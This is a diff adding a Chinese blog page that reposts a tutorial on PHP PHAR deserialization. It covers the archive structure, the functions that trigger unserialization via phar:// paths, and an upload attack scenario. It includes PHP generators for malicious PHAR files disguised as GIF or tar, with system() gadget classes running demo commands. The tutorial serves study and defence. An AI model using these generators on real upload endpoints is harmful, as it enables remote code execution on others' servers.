@@ -1,0 +1,332 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP反序列化——PHAR反序列化 | SoulfulVoyager</title><meta name="author" content="Abernethy"><meta name="copyright" content="Abernethy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP反序列化——PHAR反序列化转载于 https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;2678#(精研) https:&#x2F;&#x2F;forum.butian.net&#x2F;index.php&#x2F;share&#x2F;3007 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;291992.html Phar介绍phar，全称为PHP Archive，phar扩展提供了一种将整个PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化——PHAR反序列化">
+<meta property="og:url" content="https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="SoulfulVoyager">
+<meta property="og:description" content="PHP反序列化——PHAR反序列化转载于 https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;2678#(精研) https:&#x2F;&#x2F;forum.butian.net&#x2F;index.php&#x2F;share&#x2F;3007 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;291992.html Phar介绍phar，全称为PHP Archive，phar扩展提供了一种将整个PHP">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.shetu66.com/2023/08/03/1691035301699647.png">
+<meta property="article:published_time" content="2025-09-21T16:22:09.810Z">
+<meta property="article:modified_time" content="2025-09-21T16:21:58.100Z">
+<meta property="article:author" content="Abernethy">
+<meta property="article:tag" content="PHP反序列化">
+<meta property="article:tag" content="ThinkPHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.shetu66.com/2023/08/03/1691035301699647.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PHP反序列化——PHAR反序列化",
+  "url": "https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+  "image": "https://img.shetu66.com/2023/08/03/1691035301699647.png",
+  "datePublished": "2025-09-21T16:22:09.810Z",
+  "dateModified": "2025-09-21T16:21:58.100Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Abernethy",
+      "url": "https://sebastian-alphax.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/icons8.jpg"><link rel="canonical" href="https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP反序列化——PHAR反序列化',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://img.shetu66.com/2023/08/03/1691035301699647.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SoulfulVoyager</span></a><a class="nav-page-title" href="/"><span class="site-name">PHP反序列化——PHAR反序列化</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHP反序列化——PHAR反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-21T16:22:09.810Z" title="Created 2025-09-22 00:22:09">2025-09-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-21T16:21:58.100Z" title="Updated 2025-09-22 00:21:58">2025-09-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ThinkPHP/">ThinkPHP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PHP反序列化——PHAR反序列化"><a href="#PHP反序列化——PHAR反序列化" class="headerlink" title="PHP反序列化——PHAR反序列化"></a>PHP反序列化——PHAR反序列化</h1><p>转载于</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2678#(%E7%B2%BE%E7%A0%94)">https://forum.butian.net/share/2678#(精研)</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/3007">https://forum.butian.net/index.php/share/3007</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291992.html">https://www.freebuf.com/articles/web/291992.html</a></p>
+<h2 id="Phar介绍"><a href="#Phar介绍" class="headerlink" title="Phar介绍"></a>Phar介绍</h2><p>phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、</p>
+<p>安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程</p>
+<p>序分布在一个文件中并从该文件中运行的方法。</p>
+<h2 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h2><p>1、stub</p>
+<p>一个供phar扩展用于识别的标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以</p>
+<p>__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<p>2、manifest</p>
+<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列</p>
+<p>化的形式存储用户自定义的meta-data，而PHP在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。这里即为反序列化漏洞点。</p>
+<p>3、contents</p>
+<p>被压缩文件的内容。</p>
+<p>4、signature</p>
+<p>签名，放在文件末尾</p>
+<p><code>phar://pic/phar.phar.gz/phar.phar</code></p>
+<ul>
+<li>结构：<code>phar://[归档文件路径]/[归档内文件路径]</code></li>
+</ul>
+<h2 id="常见的可以触发Phar反序列化的PHP文件系统函数如下"><a href="#常见的可以触发Phar反序列化的PHP文件系统函数如下" class="headerlink" title="常见的可以触发Phar反序列化的PHP文件系统函数如下"></a>常见的可以触发Phar反序列化的PHP文件系统函数如下</h2><p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1280X1280.PNG" alt="1280X1280"></p>
+<p>但实际上只要调用了php_stream_open_wrapper的函数，都存在这样的问题。因此还有以下函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">exif</span><br><span class="line">exif_thumbnail</span><br><span class="line">exif_imagetype</span><br><span class="line"></span><br><span class="line">gd</span><br><span class="line">imageloadfont</span><br><span class="line">imagecreatefrom</span><br><span class="line"></span><br><span class="line">hash</span><br><span class="line">hash_hmac_file</span><br><span class="line">hash_file</span><br><span class="line">hash_update_file</span><br><span class="line">md5_file</span><br><span class="line">sha1_file</span><br><span class="line"></span><br><span class="line">file / url</span><br><span class="line">get_meta_tags</span><br><span class="line">get_headers</span><br><span class="line">mime_content_type</span><br><span class="line"></span><br><span class="line">standard</span><br><span class="line">getimagesize</span><br><span class="line">getimagesizefromstring</span><br><span class="line"></span><br><span class="line">finfo</span><br><span class="line">finfo_file</span><br><span class="line">finfo_buffer</span><br><span class="line"></span><br><span class="line">zip</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br><span class="line"></span><br><span class="line">Postgres</span><br><span class="line"><span class="meta">&lt;?php</span><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;sx&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">@<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">pgsqlCopyFromFile</span>(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;phar://test.phar/aa&#x27;</span>);</span><br><span class="line"></span><br><span class="line">MySQL</span><br><span class="line">LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper</span><br><span class="line"><span class="meta">&lt;?php</span><span class="keyword">class</span> A &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="title function_ invoke__">mysqli_init</span>();</span><br><span class="line"><span class="title function_ invoke__">mysqli_options</span>(<span class="variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">mysqli_real_connect</span>(<span class="variable">$m</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;easyweb&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line"><span class="variable">$p</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$m</span>, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://test.phar/test\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</span><br><span class="line">再配置一下mysqld。（非默认配置）</span><br><span class="line">[mysqld]</span><br><span class="line">local-infile=<span class="number">1</span></span><br><span class="line">secure_file_priv=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>文件系统函数 (最常见)：</p>
+<ul>
+<li><p><code>file_exists(‘phar://test.jpg’)</code></p>
+</li>
+<li><p><code>fopen(‘phar://test.jpg’, ‘r’)</code></p>
+</li>
+<li><p><code>file_get_contents(‘phar://test.jpg’)</code></p>
+</li>
+<li><p><code>unlink(‘phar://test.jpg’)</code> 等等。</p>
+</li>
+<li><p>只要网站有任何功能（如头像查看、文件下载、附件预览）接受了用户可控的路径参数，并且传入了这类函数，就可能触发。</p>
+</li>
+</ul>
+</li>
+<li><p>图像处理函数：非常常用的触发场景，因为攻击者常把 Phar 文件伪装成图片上传。</p>
+<ul>
+<li><p><code>exif_thumbnail(&#39;phar://test.jpg’)</code></p>
+</li>
+<li><p><code>exif_imagetype(&#39;phar://test.jpg’)</code></p>
+</li>
+<li><p><code>getimagesize(&#39;phar://test.jpg’)</code></p>
+</li>
+<li><p><code>imagecreatefromjpeg(&#39;phar://test.jpg’)</code></p>
+</li>
+<li><p>例如，一个网站上传头像后，可能会用 <code>getimagesize()</code> 来检查图片有效性，如果路径可控，就能触发。</p>
+</li>
+</ul>
+</li>
+<li><p>哈希计算函数：</p>
+<ul>
+<li><p><code>md5_file(‘phar://test.jpg’)</code></p>
+</li>
+<li><p><code>sha1_file(‘phar://test.jpg’)</code></p>
+</li>
+<li><p>如果网站提供了计算文件哈希值的功能，就可能用到这些函数。</p>
+</li>
+</ul>
+</li>
+<li><p>压缩包处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://test.jpg/test&#x27;</span>); <span class="comment">// 提取目标指向 phar 路径</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数据库操作 (高级利用)：</p>
+<ul>
+<li>MySQL - <code>LOAD DATA LOCAL INFILE</code>：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 攻击者控制连接的 MySQL 用户需要具备 FILE 权限，且服务端配置需允许 LOAD DATA LOCAL</span><br><span class="line"><span class="variable">$m</span> = mysqli_init();</span><br><span class="line">mysqli_options(<span class="variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>); // 必须开启</span><br><span class="line"><span class="variable">$s</span> = mysqli_real_connect(<span class="variable">$m</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;testdb&#x27;</span>, 3306);</span><br><span class="line">// 执行查询，让 MySQL 客户端去读取恶意 Phar 文件</span><br><span class="line"><span class="variable">$p</span> = mysqli_query(<span class="variable">$m</span>, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;</span>phar://test.jpg/test\&#x27; INTO TABLE a<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>Phar 文件必须存在于 **Web 服务器**（客户端）上，并且 PHP 有权限读取它。</p>
+<ul>
+<li><p><strong>必需配置</strong>：</p>
+<ul>
+<li><p><strong>客户端 (</strong><code>mysqli</code>)**: 必须通过 <code>mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);</code> 显式开启 <code>LOCAL</code> 功能。这是默认关闭的，为了安全。</p>
+</li>
+<li><p><strong>服务器 (</strong><code>mysqld</code>)**: 必须在 <code>my.cnf</code> 配置文件中设置 <code>local-infile=1</code>。这也是默认关闭的。</p>
+</li>
+<li><p><strong>服务器 (</strong><code>mysqld</code>)**: 通常还需要设置 <code>secure_file_priv=&quot;&quot;</code>（空值），这个选项默认为 <code>NULL</code>（即禁止 <code>LOAD FILE</code> 操作），虽然它主要影响服务器端的 <code>LOAD DATA INFILE</code>（无 LOCAL），但有时也会影响 LOCAL 行为。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>PostgreSQL - <code>pg_copy_from()</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(...);</span><br><span class="line">@<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">pgsqlCopyFromFile</span>(<span class="string">&#x27;my_table&#x27;</span>, <span class="string">&#x27;phar://test.phar/aa&#x27;</span>); <span class="comment">// 从 phar 文件拷贝数据到表</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><code>pgsqlCopyFromFile()</code> 是 PDO_PGSQL 驱动的一个方法，它用于将**客户端机器上**的一个文件的内容直接拷贝到数据库的指定表中。</p>
+<hr>
+<p><strong>一个简单的攻击场景想象：</strong></p>
+<p>一个网站有一个“从备份文件恢复数据”的功能，它允许用户上传一个 <code>.txt</code> 文件，然后后端用 <code>LOAD DATA LOCAL INFILE</code> 将这个文件的数据导入数据库。攻击者可以：</p>
+<ol>
+<li><p>生成一个恶意的 Phar 文件，重命名为 <code>backup.txt</code> 上传。</p>
+</li>
+<li><p>在上传后的表单中，指定文件路径为 <code>phar://uploads/backup.txt</code>（假设文件保存在 <code>uploads/</code> 目录）。</p>
+</li>
+</ol>
+<ol start="3">
+<li><p>网站后端执行了 <code>LOAD DATA LOCAL INFILE ‘phar://uploads/backup.txt’ INTO TABLE ...</code>。</p>
+</li>
+<li><p>攻击者的恶意代码在数据库操作之前就被执行了</p>
+</li>
+</ol>
+<hr>
+<h2 id="Phar反序列化漏洞利用"><a href="#Phar反序列化漏洞利用" class="headerlink" title="Phar反序列化漏洞利用"></a>Phar反序列化漏洞利用</h2><h3 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h3><p>伪装成gif图片格式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">class</span> A &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>生成tar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建恶意对象</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&quot;id&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建.phar目录和元数据文件</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;.phar&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;.phar/.metadata&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>));</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./test.txt&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建phar存档</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;tar -czf test2.phar .phar/.metadata ./test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理临时文件</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -r .phar test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;恶意Phar文件已创建: test2.phar&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Bzip</p>
+<p>Zip</p>
+<p>Gzip</p>
+<p>……</p>
